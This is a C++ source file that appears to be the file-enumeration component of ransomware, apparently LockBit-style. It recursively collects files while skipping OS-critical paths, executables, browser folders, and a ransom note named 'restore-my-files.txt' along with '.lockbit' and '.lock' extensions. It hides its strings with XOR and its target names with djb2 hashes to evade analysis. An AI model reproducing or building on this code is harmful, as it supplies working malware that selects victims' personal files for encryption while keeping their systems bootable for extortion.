#include "enumerate.hpp"


namespace enumerate {

    bool CheckValidFile(std::string filepath) {
        XorLogger::LogDebug(XOR_LIT("Checking File Validity: ") + filepath);

        std::filesystem::path p(filepath);
        unsigned long  filename = Hashing::Djb2HashStringA(p.filename().string());
        unsigned long ext = Hashing::Djb2HashStringA(p.extension().string());

        if (std::find(blacklist::blackListedFileNames.begin(), blacklist::blackListedFileNames.end(), filename) != blacklist::blackListedFileNames.end()) {
            XorLogger::LogDebug(XOR_LIT("File: '") + filepath + XOR_LIT("' was found in the blacklisted file names list."));
            return false;
        }

        if (!arguments::allowAllExt) {
            if (std::find(blacklist::blackListedFileExtensions.begin(), blacklist::blackListedFileExtensions.end(), ext) != blacklist::blackListedFileExtensions.end()) {
                XorLogger::LogDebug(XOR_LIT("File: '") + filepath + XOR_LIT("' extension was found in the blacklisted extensions list."));
                return false;
            }
        }

        DWORD fileInfo = GetFileAttributes(filepath.c_str());

        if (fileInfo == INVALID_FILE_ATTRIBUTES && GetLastError() == ERROR_FILE_NOT_FOUND) {
            XorLogger::LogInfo(XOR_LIT("Filepath: '") + filepath + XOR_LIT("' not found."));
            return false;
        }

        if (fileInfo & FILE_ATTRIBUTE_SYSTEM) {
            XorLogger::LogDebug(XOR_LIT("File: '") + filepath + XOR_LIT("' is a System file and will be ignored."));
            return false;
        }
        if (arguments::fileSize > 0) {
            long currentFileSize = std::filesystem::file_size(filepath);
            if (currentFileSize > arguments::fileSize) {
                XorLogger::LogDebug(XOR_LIT("File: '") + filepath + XOR_LIT("' is larger than maximum file size and will be ignored."));
                return false;
            }
        }
        XorLogger::LogDebug(XOR_LIT("File: '") + filepath + XOR_LIT("' will be logged."));
        return true;
    }

    bool CheckValidDirectory(std::filesystem::path directory) {
        if (!arguments::allowAllDir) {
            std::string dir_str =  directory.string();
            while (!dir_str.empty() && (dir_str.back() == '\\')) {
                dir_str.pop_back();
            }
            std::filesystem::path normalized(dir_str);
            std::filesystem::path fname = normalized.filename();
            unsigned long dirName = Hashing::Djb2HashStringA(to_lowercase(fname.string()));
            if (std::find(blacklist::blackListedDirectoryNames.begin(), blacklist::blackListedDirectoryNames.end(), dirName) != blacklist::blackListedDirectoryNames.end()) {
                XorLogger::LogDebug(XOR_LIT("Directory: '") + directory.string() + XOR_LIT("' is in the blacklist and will be ignored."));
                return false;
            }
        }
        return true;
    }

    std::vector<std::string> EnumerateFilesystemPath(std::string path) {
        std::vector<std::string> files;

        std::filesystem::path fsPath(path);
        XorLogger::LogDebug(XOR_LIT("Enumerating: ") + path);
        std::string enumPath = path + "*";
        try {
            if (!std::filesystem::is_symlink(fsPath)) {
                if (std::filesystem::is_directory(fsPath)) {
                    if (CheckValidDirectory(fsPath)) {
                        WIN32_FIND_DATA findData;
                        HANDLE hFind = FindFirstFile(enumPath.c_str(), &findData);

                        if (hFind != INVALID_HANDLE_VALUE) {
                            do {
                                if (std::string(findData.cFileName).compare(".") && std::string(findData.cFileName).compare("..")) {
                                    if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                                        std::vector<std::string> recursivePaths = EnumerateFilesystemPath(path + findData.cFileName + "\\");
                                        files.insert(std::end(files), std::begin(recursivePaths), std::end(recursivePaths));
                                    }
                                    else {
                                        try {
                                            if (!std::filesystem::is_symlink(path + findData.cFileName) && CheckValidFile(path + findData.cFileName)) {
                                                files.push_back(path + findData.cFileName);
                                            }
                                        }
                                        catch (const std::filesystem::filesystem_error& e) {
                                            XorLogger::LogError(XOR_LIT("Error checking symlink [passing on file]: ") + std::string{ e.what() });
                                        }

                                    }
                                }
                            } while (FindNextFile(hFind, &findData) != 0);

                            FindClose(hFind);
                        }
                    }
                            

                }
                else {
                    if (CheckValidDirectory(fsPath))
                        files.push_back(fsPath.string());
                }
            }
            else {
                XorLogger::LogDebug(XOR_LIT("Path: '") + fsPath.string() + XOR_LIT("' is a symlink and will be ignored."));
            }
        }
        catch (const std::filesystem::filesystem_error& e) {
            XorLogger::LogError(XOR_LIT("Error checking symlink [passing on file]: ") + std::string{ e.what() });
        }
        
        return files;
    }

    std::string to_lowercase(const std::string& str) {
        std::string lower_str = str;
        std::transform(lower_str.begin(), lower_str.end(), lower_str.begin(), [](unsigned char c) {return std::tolower(c); });
        return lower_str;
    }
}

namespace blacklist {
    std::vector<unsigned long> blackListedFileNames = {
        3945031190, // ntldr
        705508742, // ntuser.diagcfg
        1074552170, // ntuser.dat.log
        336408171, // autorun.inf
        470712491, // boot.diagpkg
        15010993, // bootsect.bak
        3326830211, // iconcache.db
        3476637561, // thumbs.db
        336408171, // autorun.inf
        3504179671, // restore-my-files.txt
        4167105475, // au.sfcache
        2932703876, // icon.diagcab
    };

    std::vector<unsigned long> blackListedDirectoryNames = {
        3558630563, // $windows.~bt
        444873742, // intel
        3475168565, // msocache
        2451725924, // $recycle.bin
        3558641335, // $windows.~ws
        3091515302, // boot
        1422964245, // system volume information
        4266329428, // perflogs
        2056271471, // google
        3206777408, // application data
        2241703677, // windows
        4004855914, // windows.old
        830783181, // appdata
        1410660863, // windows nt
        1818850018, // msbuild
        2471079880, // microsoft
        2360766845, // all users
        3448098538, // mozilla
        3479930685, // microsoft.net
        706787423, // microsoft shared
        698725100, // internet explorer
        92227246, // common files
        3941619209, // opera
        369712664, // windows journal
        313442923, // tor browser
    };

    std::vector<unsigned long> blackListedFileExtensions = {
        350367937, // .386
        362496347, // .adv
        362501464, // .ani
        362502492, // .apk
        362502497, // .app
        362757975, // .bat
        362762073, // .bin
        363027284, // .cmd
        363028319, // .com
        363028831, // .cpl
        363031402, // .cur
        363030377, // .css
        2115403995, // .diagcab
        2115406565, // .diagcfg
        2118830327, // .diagpkg
        363289948, // .dll
        363290456, // .dmg
        363290465, // .dmp
        363293036, // .drv
        363559266, // .exe
        363817320, // .fnt
        363817827, // .fon
        2463466124, // .gadget
        364342628, // .hlp
        364346717, // .hta
        2356810701, // .icns
        364601179, // .ico
        364601183, // .ics
        364601701, // .idx
        364606816, // .ini
        364607834, // .ipa
        364609387, // .iso
        365128553, // .key
        365396325, // .lnk
        2764980169, // .lock
        3242414344, // .lockbit
        365660000, // .mod
        365660464, // .mp3
        365660465, // .mp4
        365660510, // .mpa
        365662051, // .msc
        365662057, // .msi
        365662064, // .msp
        3181576100, // .msstyles
        365662069, // .msu
        365921645, // .nls
        366180202, // .ocx
        366188905, // .otf
        3301326295, // .part
        366446431, // .pif
        366451048, // .prf
        366451508, // .ps1
        366970214, // .rdp
        366970718, // .reg
        366975854, // .rom
        366978422, // .rtp
        17502445, // .sfcache
        367235438, // .shs
        367239535, // .spl
        367244159, // .sys
        163705907, // .theme
        367501169, // .tmp
        367504750, // .ttf
        368284508, // .wad
        368284526, // .wav
        368290661, // .wma
        4250044370, // .woff
        368292223, // .wpx
        368549749, // .xex  
    };
}